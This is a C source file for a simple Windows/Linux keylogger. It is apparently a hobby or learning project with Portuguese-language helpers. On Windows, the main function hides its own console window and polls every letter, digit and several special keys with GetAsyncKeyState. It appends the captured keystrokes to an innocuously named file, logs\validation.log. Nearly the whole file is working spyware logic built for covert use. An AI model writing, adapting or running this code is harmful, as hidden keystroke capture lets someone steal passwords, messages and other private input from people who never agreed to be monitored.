/* #############################################################################
## DESCRIPTION: Building a simple Windows-Linux Keylogger.
## NAME: main.c
## AUTHOR: Lucca Pessoa da Silva Matos
## DATE: 14.04.2020
## VERSION: 1.1
## EXEMPLE:
##     > gcc -o keylogger .\main.c keylogger.c
##############################################################################*/

// =============================================================================
// LIBRARYS
// =============================================================================

#include "log.c"
#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <unistd.h>
#include <stdbool.h>
#include "keylogger.h"

// Import windows library if this system in WINDOWS.
#if defined(_WIN32) || defined(_WIN64) || defined(__CYGWIN__) && !defined(_WIN32)
  #include <windows.h>
  #define IS_WINDOWS_VISIBLE 0
#endif

#define LOG_USE_COLOR

/* LOGGER FUNCTIONS USAGE
log_trace(const char *fmt, ...);
log_debug(const char *fmt, ...);
log_info(const char *fmt, ...);
log_warn(const char *fmt, ...);
log_error(const char *fmt, ...);
log_fatal(const char *fmt, ...);
*/

// =============================================================================
// CALL FUNCTIONS
// =============================================================================

FILE *create_file();
FILE *check_file_exist();

bool check_file_pointer_exist();

// =============================================================================
// MAIN
// =============================================================================

int main(int argc, char const *argv[]){
  set_portuguese();
  cabecalho();

  char dir[100] = "logs\\";

  char *file_name = "validation.log";

  strcat(dir, file_name);

  system("mkdir logs");

  FILE *file_pointer = check_file_exist(dir);
  file_pointer = fopen(dir, "a+");

  if(!file_pointer){
    perror("Error while opening the file.\n");
    exit(EXIT_FAILURE);
  }

  #if defined(_WIN32) || defined(_WIN64) || defined(__CYGWIN__) && !defined(_WIN32)
    log_info("We are in a Windows System.");

    HWND loggerWindow = GetConsoleWindow();

    if(IS_WINDOWS_VISIBLE){
      ShowWindow(loggerWindow, SW_MINIMIZE);
    } else{
      ShowWindow(loggerWindow, SW_HIDE);
    }

    log_info("Sleeping 150...");

    Sleep(150);

    log_info("Looping...");

    int keylogger(void){
      while(true){
        // Letters loop ("A"=65, "Z"=90)
        for(char i=65; i<91; i++){
          if(GetAsyncKeyState(i)){
            if(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)){
              fputc(i, file_pointer);
            } else{
              fputc(i+32, file_pointer);
            }
          }
        }
        // Numbers loops ("0"=48, "9"=57)
        for(char i=48; i<57; i++){
          if(GetAsyncKeyState(i)){
            fputc(i, file_pointer);
          }
        }
        // Special inputs
        if(GetAsyncKeyState(VK_RETURN)){
          fputs("[ENTER]\n", file_pointer);
        } else if(GetAsyncKeyState(VK_TAB)){
          fputs("[TAB]", file_pointer);
        } else if(GetAsyncKeyState(VK_BACK)){
          fputs("[BACKSPACE]", file_pointer);
        } else if(GetAsyncKeyState(VK_SPACE)){
          fputs("[SPACE]", file_pointer);
        } else if(GetAsyncKeyState(VK_F10)){
          fclose(file_pointer);
          return 0;
        }
        fflush(file_pointer);
        Sleep(100);
      }
    }

    log_info("Call Keylogger Function...");

    keylogger();

  #elif defined(__linux__)
    log_info("We are in a Linux System.");
    #define IS_ROOT() (geteuid() == 0) ? true : false
    if(!IS_ROOT()){
      helper();
    }else{
      log_info("Your current user is Root!");
    }
  #else
    #define PLATFORM_NAME NULL
  #endif
  return 0;
}

// =============================================================================
// FUNCTIONS
// =============================================================================

bool check_file_pointer_exist(FILE *file_pointer){
  return file_pointer ? true : false;
}

// =============================================================================

FILE *create_file(const char *file_name){
  log_info("Creating the log File %s!", file_name);
  FILE *file_pointer = NULL;
  file_pointer = fopen(file_name, "w");
  if(!check_file_pointer_exist(file_pointer)){
    log_error("Error while we create the log File %s in the system... Return NULL.", file_name);
    return NULL;
  }else{
    log_info("Success in creating the log File %s in the system!", file_name);
    return file_pointer;
  }
}

// =============================================================================

FILE *check_file_exist(const char *file_name){
  log_info("Checking if the %s alredy exist in the system", file_name);
  if(!access(file_name, F_OK )){
    log_info("The log File %s was Found in the system!", file_name);
    return NULL;
  }else{
    log_info("The log File %s not Found in the system. We will this file for you.", file_name);
    FILE *file_pointer = create_file(file_name);
    return file_pointer;
  }
}
